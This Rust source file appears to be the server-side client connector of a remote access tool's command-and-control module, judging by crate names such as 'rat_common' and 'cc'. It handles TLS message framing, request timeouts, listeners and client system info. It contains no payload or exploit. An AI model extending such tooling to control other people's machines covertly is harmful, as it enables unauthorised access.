use std::collections::{LinkedList, VecDeque};
use std::net::SocketAddr;
use std::sync::Arc;

use async_trait::async_trait;
use log::{debug, error};
use rat_common::framework::{Module, ModuleImpl, ModuleState};
use rat_common::schema::{ClientMessage, ServerMessage, SystemInfo};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{Mutex, RwLock, mpsc, oneshot};
use tokio::time;
use tokio_rustls::server::TlsStream;

use crate::config::Config;
use crate::modules::cc::info::ClientInfo;
use crate::modules::cc::listener::{ClientOnceListener, ClientPersistentListener};
use crate::modules::cc::ping::ClientPing;

pub enum Event {
    Send(ServerMessage),
    Receive(Vec<u8>),
    Terminate,
}

pub struct ClientConnector {
    _stream: Mutex<(TlsStream<TcpStream>, mpsc::Receiver<ServerMessage>)>,
    _sender: mpsc::Sender<ServerMessage>,
    _info: RwLock<Option<SystemInfo>>,
    _peer: SocketAddr,
    _config: Config,
    _name: String,
    _once_listeners: Mutex<LinkedList<ClientOnceListener>>,
    _persistent_listeners: Mutex<LinkedList<ClientPersistentListener>>,
    _total_read_buf: Mutex<VecDeque<u8>>,
    _state: Arc<ModuleState>,
}

impl ClientConnector {
    pub fn new(stream: TlsStream<TcpStream>, peer: SocketAddr, config: Config) -> Arc<Self> {
        let (sender, receiver) = mpsc::channel(1);
        Arc::new_cyclic(|this| Self {
            _stream: Mutex::new((stream, receiver)),
            _sender: sender,
            _info: RwLock::new(None),
            _peer: peer,
            _config: config.clone(),
            _name: format!("ClientConnector [{peer}]"),
            _once_listeners: Mutex::new(LinkedList::new()),
            _persistent_listeners: Mutex::new(LinkedList::new()),
            _total_read_buf: Mutex::new(VecDeque::new()),
            _state: ModuleState::new_with_submodules(vec![
                Arc::new(ClientInfo::new(peer, this.clone(), config.clone())),
                Arc::new(ClientPing::new(peer, this.clone(), config)),
            ]),
        })
    }

    pub async fn info(&self) -> Option<SystemInfo> {
        self._info.read().await.clone()
    }

    pub async fn update_info(&self, info: SystemInfo) {
        self._info.write().await.replace(info);
    }

    async fn _process_message(&self, message: ClientMessage) -> anyhow::Result<()> {
        {
            let mut new_list = LinkedList::new();
            let mut listeners = self._once_listeners.lock().await;
            while let Some(listener) = listeners.pop_front() {
                if (listener.predicate)(&message) {
                    let _ = listener.completer.send(message.clone());
                } else {
                    new_list.push_back(listener);
                }
            }

            *listeners = new_list;
        }

        {
            let mut new_list = LinkedList::new();
            let mut listeners = self._persistent_listeners.lock().await;
            while let Some(listener) = listeners.pop_front() {
                if !listener.sender.is_closed() {
                    if (listener.predicate)(&message)
                        && let Err(e) = listener.sender.try_send(message.clone())
                    {
                        error!(
                            "Unable to send message to persistent listener of {}: {e}",
                            self._peer
                        );
                    }

                    new_list.push_back(listener);
                }
            }

            *listeners = new_list;
        }

        Ok(())
    }

    async fn _send(&self, message: ServerMessage) -> anyhow::Result<()> {
        self._sender.send(message).await?;
        Ok(())
    }

    pub async fn request(&self, request: ServerMessage) -> anyhow::Result<ClientMessage> {
        let id = request.id;
        let waiter = async move { self.wait_for(move |m| m.id == id).await };

        let failure_message = format!("Failed to send {request:?} to {}", self._peer);
        let timeout_message = format!("Request {request:?} timed out to {}", self._peer);
        let result = tokio::try_join!(
            biased;
            time::timeout(self._config.request_timeout, waiter),
            time::timeout(self._config.request_timeout, self._send(request)),
        );

        match result {
            Ok((receive, send)) => {
                if let Err(e) = send {
                    anyhow::bail!("{failure_message}: {e}");
                }

                receive
            }
            Err(e) => {
                anyhow::bail!("{timeout_message}: {e}");
            }
        }
    }

    pub async fn wait_for(
        &self,
        predicate: impl Fn(&ClientMessage) -> bool + Send + Sync + 'static,
    ) -> anyhow::Result<ClientMessage> {
        let (send, receive) = oneshot::channel();

        {
            let mut listeners = self._once_listeners.lock().await;
            listeners.push_back(ClientOnceListener {
                predicate: Box::new(predicate),
                completer: send,
            });
        }

        Ok(receive.await?)
    }

    pub async fn subscribe(
        &self,
        predicate: impl Fn(&ClientMessage) -> bool + Send + Sync + 'static,
    ) -> mpsc::Receiver<ClientMessage> {
        let (sender, receiver) = mpsc::channel(self._config.client_mpsc_channel_capacity);

        let mut listeners = self._persistent_listeners.lock().await;
        listeners.push_back(ClientPersistentListener {
            predicate: Box::new(predicate),
            sender,
        });

        receiver
    }
}

impl Drop for ClientConnector {
    fn drop(&mut self) {
        debug!("Dropping module {}", self._name);
    }
}

#[async_trait]
impl ModuleImpl for ClientConnector {
    type EventType = Event;

    fn name(&self) -> &str {
        &self._name
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        let (stream, receiver) = &mut *self._stream.lock().await;
        let mut buffer = vec![0; 1024];

        tokio::select! {
            Ok(size) = stream.read(&mut buffer) => match size {
                0 => Event::Terminate,
                size => {
                    buffer.truncate(size);
                    Event::Receive(buffer)
                },
            },
            Some(message) = receiver.recv() => Event::Send(message),
            else => Event::Terminate,
        }
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        match event {
            Event::Send(message) => {
                let data = postcard::to_stdvec_cobs(&message)?;
                let mut state = self._stream.lock().await;
                state.0.write_all(&data).await?;
                state.0.flush().await?;
                debug!("Sent {data:02X?} to {}", self._peer);
            }
            Event::Receive(data) => {
                debug!("Received {data:02X?} from {}", self._peer);
                let mut total_read_buf = self._total_read_buf.lock().await;
                let mut offset = total_read_buf.len();
                total_read_buf.extend(data);

                while offset < total_read_buf.len() {
                    if total_read_buf[offset] == 0 {
                        let mut frame = total_read_buf.drain(..=offset).collect::<Vec<u8>>();
                        offset = 0;

                        match postcard::from_bytes_cobs::<ClientMessage>(&mut frame) {
                            Ok(message) => {
                                if let Err(e) = self._process_message(message).await {
                                    error!("Error processing message from {}: {e}", self._peer);
                                }
                            }
                            Err(e) => {
                                error!("Received malformed message from {}: {e}", self._peer);
                            }
                        }
                    } else {
                        offset += 1;
                    }
                }
            }
            Event::Terminate => {
                debug!("Client {} disconnected", self._peer);
                self.stop();
                return Ok(());
            }
        }

        Ok(())
    }
}
